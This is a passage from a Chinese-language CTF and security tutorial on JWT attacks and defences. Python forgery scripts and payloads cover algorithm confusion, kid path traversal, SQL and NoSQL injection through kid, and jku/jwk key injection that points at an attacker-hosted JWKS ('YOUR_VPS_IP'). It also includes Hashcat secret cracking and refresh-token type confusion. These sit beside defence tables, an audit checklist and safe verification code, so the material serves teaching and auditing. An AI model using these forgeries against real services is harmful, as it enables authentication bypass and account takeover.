| 算法混淆 | RS256 + 公钥可获取 + 未分离算法 | 中 | Python + public.pem |
| `kid` 路径穿越 | `kid` 拼入文件路径 | 中 | Python + `/dev/null` |
| `kid` SQL 注入 | `kid` 拼入 SQL | 中 | SQL 注入 payload |
| `jku` 注入 | 服务器信任 `jku` 并请求外部 URL | 高 | OpenSSL + HTTP 服务器 |
| `jwk` 注入 | 服务器信任 Header 中的公钥 | 中 | Python + RSAAlgorithm |
| `x5u` 注入 | 服务器信任 `x5u` 证书 URL | 高 | OpenSSL + HTTP 服务器 |
| Claim 绕过 | 服务端不校验 exp/iss/aud | 低 | Python 修改 Payload |
| 令牌类型混淆 | 不区分 Access/Refresh/ID Token | 中 | 修改 typ Claim |
| 重放攻击 | 已有合法令牌 | 低 | curl 直接发送 |

### Hashcat JWT 相关模式

| 模式号 | 算法 | 示例 |
|:-----:|------|------|
| 16500 | JWT (HS256/HS384/HS512) | `hashcat -m 16500 jwt.txt wordlist.txt` |
| 16600 | JWT (RS256/RS384/RS512) | 不适用于弱密钥爆破 |

### 数字签名算法特点

| 算法 | 签名大小 | 验证速度 | 密钥生成 | CTF 常见度 |
|:----:|:-------:|:--------:|:--------:|:---------:|
| HS256 | 32 字节 | 极快 | 共享密钥 |  |
| RS256 | 256 字节 | 中等 | 慢（RSA） |  |
| ES256 | 64 字节 | 快 | 快（EC） |  |
| PS256 | 256 字节 | 慢（PSS） | 慢（RSA） |  |
| EdDSA | 64 字节 | 极快 | 快 |  |

### 安全防御对照

| 防御措施 | 防止的攻击 |
|---------|-----------|
| 固定算法白名单 | `alg=none`、算法混淆 |
| 验证签名 | 直接修改 Payload |
| 强密钥 (≥256 bit) | HS 系列弱密钥爆破 |
| 限制 `kid` 为白名单 | 路径穿越、SQL 注入 |
| 禁用 `jku`/`jwk`/`x5u` | Header 注入 |
| 验证 exp/nbf/iss/aud | Claim 绕过 |
| 后端记录 jti 使用状态 | 重放攻击 |
| HTTPS 传输 | 中间人窃取 |
| HttpOnly Cookie | XSS 窃取 JWT |
| 区分令牌类型 | 类型混淆攻击 |
| 短有效期 | 缩小重放窗口 |

### JWT 标准 Claim 速查

| Claim | 全称 | 类型 | 说明 |
|:-----:|:----:|:----:|------|
| `iss` | Issuer | string | 令牌签发者 URL |
| `sub` | Subject | string | 令牌主体（通常是用户 ID） |
| `aud` | Audience | string/array | 令牌接收方 |
| `exp` | Expiration Time | numeric | 过期时间（Unix 时间戳） |
| `nbf` | Not Before | numeric | 在此时间之前无效 |
| `iat` | Issued At | numeric | 签发时间 |
| `jti` | JWT ID | string | 令牌唯一标识 |
| `typ` | Type | string | 令牌类型（`JWT`、`at+jwt` 等） |

### 快速验证命令

```bash
# 在 Linux 中查看公钥
cat public.pem

# 生成 RSA 密钥对（用于 jku/jwk 攻击）
openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
openssl pkey -in private.pem -pubout -out public.pem

# 手动解码 JWT
echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d 2>/dev/null || \
echo 'eyJhbGciOiJIUzI1NiJ9' | python3 -c "import sys,base64; print(base64.urlsafe_b64decode(sys.stdin.read()+'=='))"

# 完整解码 JWT（不验证）
python3 -c "
import jwt
token = 'eyJ...完整JWT...'
print('Header:', jwt.get_unverified_header(token))
print('Payload:', jwt.decode(token, options={'verify_signature': False}))
"

# Hashcat JWT 爆破
hashcat -m 16500 jwt.txt wordlist.txt --force
```

---

## 七、JWT 完整实战场景演练

### 7.1 场景一：跳过签名验证

**题目**：拿到一个 JWT `eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.xxx`，目标是成为 admin。

```python
import base64, json

token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.xxx"
h_b64, p_b64, s_b64 = token.split(".")

def b64u_encode(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

# 解码并修改
payload = json.loads(base64.urlsafe_b64decode(p_b64 + "=="))
payload["role"] = "admin"
payload["username"] = "admin"

new_p = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
new_token = f"{h_b64}.{new_p}.{s_b64}"
print(new_token)
```

**如果成功**：服务端未验证签名。

### 7.2 场景二：算法混淆攻击

**题目**：公钥可从 `/.well-known/jwks.json` 获取。

```bash
# 获取公钥并保存
curl -s http://target/.well-known/jwks.json | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(json.dumps(data, indent=2))
" > jwks.json
```

```python
import base64, hashlib, hmac, json

# 提取公钥（实际场景中需要解析 JWK 为 PEM 格式）
with open("public.pem", "rb") as f:
    public_key = f.read()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin", "role": "admin", "is_admin": True}

def b64u_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
p_b64 = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
signing = f"{h_b64}.{p_b64}".encode()
signature = hmac.new(public_key, signing, hashlib.sha256).digest()
sig_b64 = b64u_encode(signature)

print(f"{h_b64}.{p_b64}.{sig_b64}")
```

### 7.3 场景三：kid 路径穿越

**题目**：服务端从 `/app/keys/{kid}` 读取密钥。

```python
import base64, hashlib, hmac, json

header = {"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
payload = {"username": "admin", "role": "admin"}

def b64u_encode(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
p_b64 = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
signing = f"{h_b64}.{p_b64}".encode()
sig = b64u_encode(hmac.new(b"", signing, hashlib.sha256).digest())

print(f"{h_b64}.{p_b64}.{sig}")
```

### 7.4 场景四：jku 注入

**题目**：服务端信任 `jku` 并获取 JWKS。

**VPS 上的 jwks.json**：
```json
{
  "keys": [{
    "kty": "RSA",
    "kid": "attack-key",
    "use": "sig",
    "alg": "RS256",
    "n": "0vx7agoebGcQSuu...（Base64URL 编码的模数）",
    "e": "AQAB"
  }]
}
```

**伪造 JWT**：
```python
import jwt

private_key = open("private.pem").read()
payload = {"username": "admin", "role": "admin"}
headers = {"kid": "attack-key", "jku": "http://你的VPS/jwks.json"}
token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(token)
```

### 7.5 场景五：HS256 弱密钥爆破

**题目**：JWT 使用 HS256，密钥在常见的密码字典中。

```bash
# 保存 JWT 到 token.txt
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.xxxxx" > token.txt

# 用 Hashcat 爆破
hashcat -m 16500 token.txt rockyou.txt

# 查看结果
hashcat -m 16500 token.txt --show
```

**破解后生成管理员令牌**：
```python
import jwt, time
secret = "破解出的密钥"
payload = {
    "username": "admin",
    "role": "admin",
    "exp": int(time.time()) + 3600,
}
print(jwt.encode(payload, secret, algorithm="HS256"))
```

### 7.6 场景六：Claim 校验不完整

**题目**：JWT 签名验证通过，但不检查 `exp`。

```python
import jwt
# 即使 JWT 中的 exp 是 1970 年，只要删除 exp 字段
# 或者设置一个未来的时间戳
payload = {"username": "admin", "role": "admin", "exp": 4102444800}
# 需有合法签名
```

---

## 八、JWT 安全 Header 字段详解

| Header 字段 | 用途 | 是否可信 | 安全风险 |
|:----------:|:----:|:--------:|:--------:|
| `alg` | 签名算法 |  攻击者可改 | none 绕过、算法混淆 |
| `typ` | 令牌类型 |  | 类型混淆 |
| `kid` | 密钥标识 |  攻击者可改 | 路径穿越、SQL 注入 |
| `jku` | JWKS URL |  攻击者可改 | SSRF、密钥注入 |
| `jwk` | 内嵌公钥 |  攻击者可改 | 公钥欺骗 |
| `x5u` | 证书 URL |  攻击者可改 | SSRF、证书欺骗 |
| `x5c` | 内嵌证书 |  攻击者可改 | 证书欺骗 |
| `crit` | 必须检查的头 |  攻击者可改 | 未预期行为 |

## 九、多语言 JWT 生成与验证速查

### Python (PyJWT)

```python
# 生成
import jwt, time
token = jwt.encode(
    {"sub": "123", "exp": int(time.time()) + 3600},
    "secret",
    algorithm="HS256"
)

# 验证
try:
    payload = jwt.decode(token, "secret", algorithms=["HS256"])
    print(payload)
except jwt.ExpiredSignatureError:
    print("expired")
except jwt.InvalidTokenError:
    print("invalid")
```

### PHP (firebase/php-jwt)

```php
<?php
require 'vendor/autoload.php';
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

$payload = [
    "sub" => "123",
    "exp" => time() + 3600,
];

$jwt = JWT::encode($payload, 'secret', 'HS256');

// 验证
$decoded = JWT::decode($jwt, new Key('secret', 'HS256'));
print_r($decoded);
?>
```

### Node.js (jsonwebtoken)

```javascript
const jwt = require('jsonwebtoken');

// 生成
const token = jwt.sign(
    { sub: '123', exp: Math.floor(Date.now() / 1000) + 3600 },
    'secret',
    { algorithm: 'HS256' }
);

// 验证
try {
    const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256'] });
    console.log(decoded);
} catch (err) {
    console.log('invalid');
}
```

### Go (golang-jwt)

```go
import "github.com/golang-jwt/jwt/v5"

// 生成
claims := jwt.MapClaims{
    "sub": "123",
    "exp": time.Now().Add(time.Hour).Unix(),
}
token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
signed, _ := token.SignedString([]byte("secret"))

// 验证
parsed, err := jwt.Parse(signed, func(t *jwt.Token) (interface{}, error) {
    return []byte("secret"), nil
})
if claims, ok := parsed.Claims.(jwt.MapClaims); ok && parsed.Valid {
    fmt.Println(claims)
}
```

### Java (jjwt)

```java
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import javax.crypto.spec.SecretKeySpec;
import java.util.Date;
import java.util.Base64;

// 生成
String secret = "my-secret-key";
byte[] keyBytes = secret.getBytes();
SecretKeySpec key = new SecretKeySpec(keyBytes, SignatureAlgorithm.HS256.getJcaName());

String token = Jwts.builder()
    .claim("sub", "123")
    .setExpiration(new Date(System.currentTimeMillis() + 3600000))
    .signWith(key)
    .compact();

// 验证
Claims claims = Jwts.parserBuilder()
    .setSigningKey(key)
    .build()
    .parseClaimsJws(token)
    .getBody();
```

---

## 十、JWT 安全审计清单

### 10.1 签名验证

- [ ] 是否验证了 Signature？
- [ ] 是否使用了 `verify_signature=False`？
- [ ] 验证失败时是否返回 401？

### 10.2 算法配置

- [ ] 是否固定了算法白名单？
- [ ] 是否拒绝 `alg=none`？
- [ ] 对称和非对称算法是否分离？
- [ ] 是否从 Header 读取 `alg` 决定验证方式？

### 10.3 密钥管理

- [ ] HS 系列密钥是否足够强？（≥256 bit）
- [ ] 密钥是否硬编码在源码中？
- [ ] `.env` 文件是否泄露？

### 10.4 Header 注入

- [ ] `kid` 是否限制为白名单？
- [ ] `jku` 是否验证域名白名单？
- [ ] `jwk` 是否直接信任内嵌公钥？
- [ ] `x5u` 是否验证证书来源？

### 10.5 Claim 校验

- [ ] 是否验证 `exp`？
- [ ] 是否验证 `nbf`？
- [ ] 是否验证 `iss` 和 `aud`？
- [ ] 是否在 `exp` 缺失时拒绝？

### 10.6 令牌管理

- [ ] 是否有令牌吊销机制？
- [ ] `jti` 是否使用和验证？
- [ ] Access/Refresh/ID Token 是否使用不同密钥？

---

## 十一、快速故障排查

### 修改 Payload 后无效

| 可能原因 | 排查方法 |
|:--------:|:--------:|
| 改错了令牌位置 | 检查 HTTP Header vs Cookie |
| 检查 `exp` 已过期 | 延长 `exp` 或删除 |
| 签名验证确实存在 | 换其他攻击方法 |
| JWT 格式错误 | 检查 Base64URL 填充和空格 |

### 算法混淆失败

| 可能原因 | 排查方法 |
|:--------:|:--------:|
| 公钥不在白名单路径 | 尝试 `/public.pem` `/jwks.json` |
| 公钥内容不完整 | 确认包含 `-----BEGIN PUBLIC KEY-----` |
| 服务端库已防御 | 检查是否固定了算法白名单 |

### jku 注入失败

| 可能原因 | 排查方法 |
|:--------:|:--------:|
| 服务器不能出网 | 换 kid 注入或其他方法 |
| 未设置 CORS | jku 获取 JWKS 不需要 CORS |
| `kid` 不匹配 | 确保 JWKS 中的 kid 和 Header 中的 kid 一致 |

---

 **新手避坑**：JWT 的 typ Claim 也可以被篡改。有些库根据 `typ` 字决定如何处理令牌。将 `typ` 从 `JWT` 改为 `JOSE` 或丢弃 `typ` 字段可能导致不同的处理路径。

## 十二、JWT 扩展攻击技术

### 12.1 kid 注入完整攻击链

**场景一：路径穿越获取空密钥**

```json
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
```

```python
import hmac, hashlib, base64, json

# 使用空密钥签名
header = {"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
payload = {"username":"admin","role":"admin","is_admin":True}

def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

h = b64u(json.dumps(header,separators=(",",":")).encode())
p = b64u(json.dumps(payload,separators=(",",":")).encode())
s = b64u(hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{s}")
```

**场景二：SQL 注入获取自定义密钥**

当后端代码类似：

```python
kid = header.get("kid")
cursor.execute(f"SELECT secret FROM jwt_keys WHERE kid = '{kid}'")
row = cursor.fetchone()
```

SQLite 注入：

```json
{"kid":"' UNION SELECT 'my_custom_secret' --"}
```

MySQL 注入：

```json
{"kid":"' UNION SELECT 'my_custom_secret' -- "}
```

PostgreSQL 注入：

```json
{"kid":"' UNION SELECT 'my_custom_secret'::text --"}
```

**场景三：NoSQL 注入（MongoDB）**

当 kid 参数在服务端被解析为 JSON 对象时：

```json
// 原始请求
{"kid": {"$gt": ""}}    // MongoDB 中匹配所有非空 kid

// 返回第一个密钥 → 用于伪造 JWT
```

```json
{"kid": {"$ne": "nonexistent"}}  // 匹配任意存在的 kid
```

### 12.2 jku/jwk 完整利用链（含 Docker 部署）

**步骤 1: 生成 RSA 密钥对**

```bash
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out private.pem
openssl pkey -in private.pem -pubout -out public.pem
```

**步骤 2: 生成 JWKS JSON 文件**

```python
import json, jwt
from jwt.algorithms import RSAAlgorithm

with open("private.pem", "rb") as f:
    private_key = f.read()
with open("public.pem", "rb") as f:
    public_key = f.read()

# 生成 JWK
jwk = json.loads(RSAAlgorithm.to_jwk(public_key))
jwk["kid"] = "attacker-key-001"
jwk["use"] = "sig"
jwk["alg"] = "RS256"

jwks = {"keys": [jwk]}
with open("jwks.json", "w") as f:
    json.dump(jwks, f, indent=2)
```

**步骤 3: 启动 HTTP 服务托管 JWKS**

```bash
# Python 简单 HTTP 服务器
python3 -m http.server 9999 &
# 或使用 Flask/nginx
```

**步骤 4: 生成伪造 JWT**

```python
import jwt

payload = {
    "username": "admin",
    "role": "admin",
    "is_admin": True,
    "iat": 1760000000,
    "exp": 4102444800  # 2099年过期
}

headers = {
    "kid": "attacker-key-001",
    "jku": "http://YOUR_VPS_IP:9999/jwks.json"
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(f"[+] 伪造 JWT:\n{token}")
```

**步骤 5: 利用 jwk 嵌入公钥（无需 HTTP 服务器）**

```python
headers = {
    "kid": "attacker-key-001",
    "jwk": jwk  # 直接嵌入公钥
}
token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(f"[+] 嵌入 JWK JWT:\n{token}")
```

### 12.3 令牌类型混淆完整攻击

**场景：Refresh Token 被当作 Access Token**

系统通常使用两种令牌：

```
Access Token:  有效期短（15分钟），用于访问 API
Refresh Token: 有效期长（7天），用于获取新的 Access Token
```

如果服务端验证 Access Token 和 Refresh Token 的逻辑相同，攻击者可：

```python
import base64, json, requests

# 假设获得了一个 Refresh Token
refresh_token = "eyJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoicmVmcmVzaCIsInVzZXJuYW1lIjoiZ3Vlc3QifQ.xxx"

# 直接发送到需要 Access Token 的接口
api_response = requests.get(
    "http://target/api/admin/flag",
    headers={"Authorization": f"Bearer {refresh_token}"}
)
print(api_response.text)
```

**防御方式【完整示例】：**

```python
# 安全的验证逻辑
def verify_access_token(token: str) -> dict:
    payload = jwt.decode(
        token,
        key,
        algorithms=["HS256"],
        options={"require": ["exp", "type"]}
    )
    if payload.get("type") != "access":
        raise jwt.InvalidTokenError("Not an access token")
    return payload

def verify_refresh_token(token: str) -> dict:
    payload = jwt.decode(
        token,
        REFRESH_KEY,  # 使用不同的密钥
        algorithms=["HS256"],
        options={"require": ["exp", "type"]}
    )
    if payload.get("type") != "refresh":
        raise jwt.InvalidTokenError("Not a refresh token")
    return payload
```

**类型混淆攻击的三种变体：**

| 变体 | 攻击方式 | 防御方法 |
|:----|:---------|:---------|
| Access/Refresh 混淆 | Refresh Token 发到 API 接口 | 不同的 `typ`/不同的密钥 |
| ID Token 冒充 | ID Token 作为 Access Token | 不同的 `aud`/验证 `typ` |
| 跨服务混淆 | A 服务的 Token 用于 B 服务 | 不同的 `iss`/不同的密钥 |

### 12.4 Refresh Token 轮换攻击

OAuth 2.0 中 Refresh Token 轮换（Rotation）机制可能被以下方式绕过：

```
正常流程：
  使用 Refresh Token → 获得新 Access Token + 新 Refresh Token
  旧 Refresh Token 失效

攻击流程：
  窃取 Refresh Token → 重复使用（如果未正确轮换）
  窃取 Refresh Token → 在轮换窗口内使用两次（如果未检测重复使用）
```

```python
import requests

def refresh_token_attack(base_url, stolen_refresh_token):
    """测试 Refresh Token 是否可以重复使用"""

    # 第一次使用
    r1 = requests.post(f"{base_url}/token/refresh", json={
        "refresh_token": stolen_refresh_token
    })
    print(f"[*] 第一次使用: {r1.status_code}")

    # 第二次使用（如果第一关通过，说明未轮换）
    r2 = requests.post(f"{base_url}/token/refresh", json={
        "refresh_token": stolen_refresh_token
    })
    print(f"[*] 第二次使用: {r2.status_code}")

    if r2.status_code == 200:
        print("[!] Refresh Token 未轮换！可重复使用")
    else:
        print("[*] Refresh Token 已正确轮换")
```

### 12.5 各语言 JWT 签名验证代码示例

**PHP (firebase/php-jwt)：**

```php
<?php
require_once 'vendor/autoload.php';
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

// 签名
$payload = ["username" => "admin", "role" => "admin"];
$jwt = JWT::encode($payload, 'secret-key', 'HS256');

// 解码验证
$decoded = JWT::decode($jwt, new Key('secret-key', 'HS256'));
print_r((array)$decoded);
?>
```

**Node.js (jsonwebtoken)：**

```javascript
const jwt = require('jsonwebtoken');

// 签名
const payload = { username: 'admin', role: 'admin' };
const token = jwt.sign(payload, 'secret-key', { algorithm: 'HS256', expiresIn: '1h' });

// 验证
const decoded = jwt.verify(token, 'secret-key', { algorithms: ['HS256'] });
console.log(decoded);
```

**Go (golang-jwt)：**

```go
package main
import (
    "fmt"
    "github.com/golang-jwt/jwt/v5"
)

func main() {
    // 签名
    claims := jwt.MapClaims{"username": "admin", "role": "admin"}
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    tokenString, _ := token.SignedString([]byte("secret-key"))
    fmt.Println(tokenString)

    // 验证
    parsed, _ := jwt.Parse(tokenString, func(t *jwt.Token) (interface{}, error) {
        return []byte("secret-key"), nil
    })
    fmt.Println(parsed.Claims)
}
```

**Java (jjwt 0.12+)：**

```java
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;
import javax.crypto.SecretKey;

// 签名
SecretKey key = Keys.hmacShaKeyFor("secret-key-here-32-chars!!".getBytes());
String token = Jwts.builder()
    .claim("username", "admin")
    .claim("role", "admin")
    .signWith(key)
    .compact();

// 验证
var claims = Jwts.parser()
    .verifyWith(key)
    .build()
    .parseClaimsJws(token)
    .getBody();
```

### 12.6 JWT 各攻击方法成功率与工具

| 攻击方法 | 成功率 | 所需工具 | 难度 | CTF 出现率 |
|:--------|:------:|:---------|:----:|:---------:|
| 跳过签名验证 | 高 | Python/curl | 低 |  |
| alg=none | 中 | Python | 低 |  |
| HS 弱密钥爆破 | 高 | Hashcat/john | 中 |  |
| 算法混淆 RS→HS | 中 | Python + public.pem | 中 |  |
| kid 路径穿越 | 中 | Python | 中 |  |
| kid SQL 注入 | 中 | curl + SQL 注入 | 高 |  |
| jku 注入 | 低 | OpenSSL + HTTP 服务器 | 高 |  |
| jwk 嵌入公钥 | 中 | Python + RSAAlgorithm | 中 |  |
| x5u 证书注入 | 低 | OpenSSL + HTTP 服务器 | 高 |  |
| Claim 绕过 | 高 | Python 修改 | 低 |  |
| 类型混淆 | 中 | Python | 中 |  |

### 12.7 JWT 安全防御对照扩展

| 防御措施 | 解决的问题 | 实施难度 | 绕过难度 |
|:---------|:-----------|:--------:|:--------:|
| 固定算法白名单 | alg=none、算法混淆 | 低 | 高 |
| 验证签名 | 直接修改 Payload | 低 | 高 |
| 强密钥 (≥256 bit) | HS 弱密钥爆破 | 低 | 高 |
| 白名单 kid | 路径穿越、SQL 注入 | 低 | 高 |
| 禁用 jku/jwk/x5u | Header 注入 | 低 | 高 |
| 验证 exp/nbf/iss/aud | Claim 绕过 | 低 | 高 |
| 后端记录 jti | 重放攻击 | 中 | 高 |
| 不同密钥分令牌类型 | 类型混淆 | 中 | 高 |
| 短有效期 exp | 缩小重放窗口 | 低 | 中 |
| HttpOnly + Secure Cookie | XSS 窃取 | 低 | 高 |
| Token Binding | 令牌劫持 | 高 | 很高 |
| Certificate Bound Token | 令牌绑定 | 高 | 很高 |

### 12.8 JWT 手动解码与签名验证速查

```python
# 手动验证 HS256 签名
import base64, hmac, hashlib, json

token = "eyJh...完整JWT"
h_b64, p_b64, s_b64 = token.split(".")
signing_input = f"{h_b64}.{p_b64}".encode()

# 补全 Base64URL 填充
def b64u_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

# 使用已知密钥验证
secret = b"known-secret"
expected_sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
actual_sig = b64u_decode(s_b64)

if hmac.compare_digest(expected_sig, actual_sig):
    print("[+] 签名有效")
else:
    print("[-] 签名无效")
```

### 12.9 JWK 与 JWKS 格式详解

**JWK (JSON Web Key) 单个密钥格式：**

```json
{
  "kty": "RSA",
  "kid": "key-id-001",
  "use": "sig",
  "alg": "RS256",
  "n": "0vx7agoebGcQSuu...（Base64URL 编码的 RSA 模数 n）",
  "e": "AQAB",
  "d": "（私钥指数，不放在公开 JWK 中）"
}
```

**JWKS (JSON Web Key Set) 密钥集合格式：**

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "key-2024-01",
      "n": "...",
      "e": "AQAB"
    },
    {
      "kty": "EC",
      "kid": "key-2024-02",
      "crv": "P-256",
      "x": "...",
      "y": "..."
    }
  ]
}
```

| JWK 参数 | 含义 | 必需 |
|:---------|:-----|:----:|
| `kty` | 密钥类型（RSA/EC/oct） | 是 |
| `kid` | 密钥 ID | 建议 |
| `use` | 用途（sig/enc） | 可选 |
| `alg` | 算法 | 可选 |
| `n` | RSA 模数 | RSA 必需 |
| `e` | RSA 公钥指数 | RSA 必需 |
| `crv` | EC 曲线 | EC 必需 |
| `x` | EC x 坐标 | EC 必需 |
| `y` | EC y 坐标 | EC 必需 |

### 12.10 JWT 攻击思维导图（完整版）

```
拿到 JWT
  ├── 1. 检查是否有签名验证
  │     ├── 改 Payload + 保留签名 → 通过 = 无验证
  │     └── 不通过 → 进 2
  │
  ├── 2. 检查算法
  │     ├── alg=none → 绕过
  │     ├── RS256 → 算法混淆 | jku | jwk | x5u
  │     ├── HS256 → 弱密钥爆破
  │     └── ES256 → 检查随机数复用
  │
  ├── 3. 检查 Header
  │     ├── kid → 路径穿越 | SQL注入 | NoSQL注入
  │     ├── jku → 自建 JWKS 服务器（+SSRF）
  │     ├── jwk → 嵌入攻击者公钥
  │     └── x5u → 自建证书服务器（+SSRF）
  │
  ├── 4. 检查 Claim
  │     ├── exp → 删除/延长
  │     ├── nbf → 删除/提前
  │     ├── iss → 跨系统冒用
  │     └── aud → 跨 API 冒用
  │
  ├── 5. 令牌类型
  │     ├── Access Token vs Refresh Token
  │     └── ID Token vs Access Token
  │
  └── 6. 重放
        ├── 直接重用已有令牌
        └── 窃取后重放
```

### 12.11 20 个 JWT  新手避坑完整版

| # | 误区 | 正解 |
|:-:|:-----|:-----|
| 1 | 解码成功 = 令牌合法 | 解码只是 Base64URL，任何人都能做 |
| 2 | 先爆破 HS 密钥 | 先测试是否验证签名 |
| 3 | 改 Payload 后服务端不理 | 可能改错了令牌位置 |
| 4 | alg=none 一定有效 | 只在库配置错误时有效 |
| 5 | 公钥泄露 = 密钥泄露 | 非对称中公钥公开没事 |
| 6 | kid 一定有漏洞 | 正常实现可能是白名单字典 |
| 7 | jti 自动防重放 | 需要后端记录状态 |
| 8 | HS256 JWT 能被 RS 私钥爆破 | 模式 16500 只适用于 HS 系列 |
| 9 | 签名验证通过就安全 | 还要检查其他 Claim |
| 10 | HTTPS 下 JWT 安全 | 泄露渠道不止截获 |
| 11 | 所有令牌类型都一样 | Access/Refresh/ID Token 不同 |
| 12 | jku 只能看不能打 | 还可能造成 SSRF |
| 13 | 空密钥一定被拒绝 | 有些实现允许空密钥 |
| 14 | HS256 密钥长度不重要 | 弱密钥可被秒级爆破 |
| 15 | 签名验证 = 完全安全 | Claim 校验同样重要 |
| 16 | JWT 字段顺序不影响签名 | JSON 字段顺序影响签名结果 |
| 17 | kid 只用于查找密钥 | 还可能注入 SQL/路径/命令 |
| 18 | 所有 JWT 库默认安全 | 许多默认配置存在漏洞 |
| 19 | Refresh Token 不能用于 API | 类型混淆下可能被误用 |
| 20 | JWKS 端点一定可信 | 攻击者可伪装端点 |

---

>**一句话总结：** JWT 的安全不在于 Payload 能否被解码（任何人都能解码），而在于签名验证是否严格、密钥是否安全、Header 和 Claim 是否被正确校验。按照"签名验证→算法控制→密钥安全→Header注入→Claim校验→类型混淆→重放"的 7 层模型逐一检查。

> 最后更新：2026-07
